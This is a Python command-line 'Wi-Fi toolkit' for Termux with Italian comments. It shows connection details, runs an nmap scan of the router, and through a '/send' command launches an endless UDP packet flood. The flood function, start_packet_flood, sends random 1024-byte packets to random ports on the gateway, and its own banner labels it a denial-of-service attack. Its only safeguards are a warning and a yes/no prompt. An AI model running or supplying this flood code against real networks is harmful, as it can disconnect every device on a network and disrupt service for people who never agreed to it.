import subprocess
import json
import re
import socket
import random
import time
import os
import sys

# --- Funzioni di Utilità e Colori ---

def run_command(command):
    """Esegue un comando di sistema e restituisce l'output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True, encoding='utf-8')
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Errore: {e.stderr.strip()}"
    except FileNotFoundError:
        return f"Errore: Comando '{command.split()[0]}' non trovato."

def get_gateway_ip():
    """Trova l'IP del gateway (router) in Termux."""
    output = run_command("ip route")
    match = re.search(r'default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
    return match.group(1) if match else None

def print_header(title):
    """Stampa un'intestazione colorata."""
    print(f"\n\033[1;34m--- {title.upper()} ---\033[0m")

def print_label_value(label, value, color="\033[1;32m"):
    """Stampa una coppia etichetta-valore."""
    print(f"{label:<25}: {color}{value}\033[0m")

# --- Funzioni Principali del Toolkit ---

def show_wifi_info():
    """Mostra un'analisi completa e dettagliata della connessione Wi-Fi."""
    print_header("Analisi Connessione Wi-Fi")

    # 1. Informazioni Base da Termux API
    print("\033[1;36m[+] Informazioni Base dall'API di Android\033[0m")
    wifi_info_json = run_command("termux-wifi-connectioninfo")
    if "Errore" not in wifi_info_json and wifi_info_json:
        try:
            data = json.loads(wifi_info_json)
            rssi = data.get("rssi", "N/D")
            # Conversione approssimativa RSSI in Qualità (%)
            if isinstance(rssi, int):
                if rssi > -50:
                    quality = "Eccellente"
                elif rssi > -70:
                    quality = "Buona"
                elif rssi > -80:
                    quality = "Sufficiente"
                else:
                    quality = "Scarsa"
                quality_str = f"{quality} ({rssi} dBm)"
            else:
                quality_str = "N/D"

            print_label_value("SSID", data.get("ssid", "N/D"))
            print_label_value("BSSID (MAC AP)", data.get("bssid", "N/D"))
            print_label_value("Qualità Segnale", quality_str)
            print_label_value("Velocità Link", f"{data.get('link_speed_mbps', 'N/D')} Mbps")
            print_label_value("Frequenza", f"{data.get('frequency_mhz', 'N/D')} MHz")
            print_label_value("IP Locale", data.get("ip", "N/D"))
            print_label_value("IP Pubblico", run_command("curl -s ifconfig.me"))
            print_label_value("Soppressione Rete", data.get("supplicant_state", "N/D"))
        except json.JSONDecodeError:
            print_label_value("Errore", "Impossibile analizzare l'output di termux-api.")
    else:
        print("Impossibile ottenere info Wi-Fi. Assicurati che termux-api sia installato e funzionante.")

    # 2. Informazioni di Rete (Gateway, DNS)
    print("\n\033[1;36m[+] Dettagli di Rete\033[0m")
    gateway_ip = get_gateway_ip()
    if gateway_ip:
        print_label_value("Gateway (Router)", gateway_ip)
        # Ping al gateway per latenza locale
        ping_output = run_command(f"ping -c 3 {gateway_ip}")
        latency_match = re.search(r'min/avg/max/mdev = [\d.]+/([\d.]+)/', ping_output)
        latency = f"{latency_match.group(1)} ms" if latency_match else "N/D"
        print_label_value("Latenza (vs Gateway)", latency)
    else:
        print_label_value("Gateway (Router)", "Non trovato")

    dns1 = run_command("getprop net.dns1")
    dns2 = run_command("getprop net.dns2")
    print_label_value("Server DNS 1", dns1)
    print_label_value("Server DNS 2", dns2)

    # 3. Scansione Avanzata del Gateway con Nmap
    if gateway_ip:
        print("\n\033[1;36m[+] Scansione Avanzata del Gateway (potrebbe richiedere tempo)\033[0m")
        print(f"Esecuzione di 'nmap -F {gateway_ip}'...")
        nmap_output = run_command(f"nmap -F {gateway_ip}")
        print("\033[0;33m" + nmap_output + "\033[0m")


def start_packet_flood(amount_str):
    """
    Invia una raffica di pacchetti UDP al gateway per testare la stabilità della rete.
    """
    print_header("Stress Test Wi-Fi (Attacco DoS)")
    print("\033[1;31m*** ATTENZIONE: STAI PER INIZIARE UN ATTACCO DENIAL OF SERVICE ***\033[0m")
    print("\033[1;33mUsalo solo sulla tua rete. Potrebbe disconnettere tutti i dispositivi.\033[0m")
    
    confirm = input("Sei assolutamente sicuro di voler procedere? (sì/no): ").lower()
    if confirm != 'sì':
        print("Operazione annullata.")
        return

    try:
        amount = int(amount_str)
    except ValueError:
        print("\033[1;31mErrore: La quantità deve essere un numero intero.\033[0m")
        return

    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("\033[1;31mErrore: Impossibile trovare l'IP del gateway. Impossibile continuare.\033[0m")
        return

    print(f"\nTarget: Gateway ({gateway_ip})")
    print(f"Modalità: {amount} pacchetti UDP ogni 50 secondi.")
    print("\033[1;36mPremi Ctrl+C per interrompere il ciclo di attacco.\033[0m")
    time.sleep(3)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 1024 bytes di dati casuali
        payload = random.randbytes(1024) 
        
        cycle = 1
        while True:
            print(f"\n--- Ciclo #{cycle} ---")
            print(f"Invio di {amount} pacchetti a {gateway_ip}...")
            
            for i in range(amount):
                # Scegli una porta casuale per ogni pacchetto per variare l'attacco
                port = random.randint(1025, 65535)
                s.sendto(payload, (gateway_ip, port))
                # Stampa un progresso senza andare a capo
                print(f"\rPacchetti inviati: {i+1}/{amount}", end="")
            
            print("\n\033[1;32mRaffica completata.\033[0m In attesa di 50 secondi...")
            time.sleep(50)
            cycle += 1

    except KeyboardInterrupt:
        print("\n\n\033[1;31mAttacco interrotto dall'utente.\033[0m")
    except Exception as e:
        print(f"\n\n\033[1;31mSi è verificato un errore: {e}\033[0m")
    finally:
        s.close()


def show_help():
    """Mostra i comandi disponibili."""
    print_header("Comandi Disponibili")
    print("  \033[1;32minfo\033[0m          - Mostra un'analisi dettagliata della connessione Wi-Fi.")
    print("  \033[1;32m/send <num>\033[0m   - Invia <num> pacchetti al router ogni 50 secondi (Stress Test).")
    print("  \033[1;32mhelp\033[0m          - Mostra questo messaggio di aiuto.")
    print("  \033[1;32mclear\033[0m         - Pulisce lo schermo.")
    print("  \033[1;32mexit\033[0m          - Esce dal toolkit.")

def main():
    """Ciclo principale del toolkit."""
    # Controlla dipendenze
    if "not found" in run_command("termux-wifi-connectioninfo --version"):
        print("\033[1;31mErrore: 'termux-api' non sembra installato o funzionante.\033[0m")
        print("Esegui 'pkg install termux-api' e riprova.")
        sys.exit(1)

    os.system("clear")
    print("\033[1;34m=====================================\033[0m")
    print("\033[1;36m    Python Wi-Fi Toolkit per Termux\033[0m")
    print("\033[1;34m=====================================\033[0m")
    print("Digita 'help' per la lista dei comandi.")

    while True:
        try:
            raw_input = input("\n\033[1;35mtoolkit> \033[0m").strip()
            if not raw_input:
                continue

            parts = raw_input.split()
            command = parts[0].lower()

            if command == "info":
                show_wifi_info()
            elif command == "/send":
                if len(parts) > 1:
                    start_packet_flood(parts[1])
                else:
                    print("\033[1;31mUso: /send <numero_pacchetti>\033[0m")
            elif command == "help":
                show_help()
            elif command == "clear":
                os.system("clear")
            elif command == "exit":
                print("Uscita in corso...")
                break
            else:
                print(f"\033[1;31mComando '{command}' non riconosciuto. Digita 'help'.\033[0m")

        except KeyboardInterrupt:
            print("\nUscita in corso... (Ctrl+C rilevato)")
            break
        except Exception as e:
            print(f"\n\033[1;31mSi è verificato un errore imprevisto: {e}\033[0m")


if __name__ == "__main__":
    main()
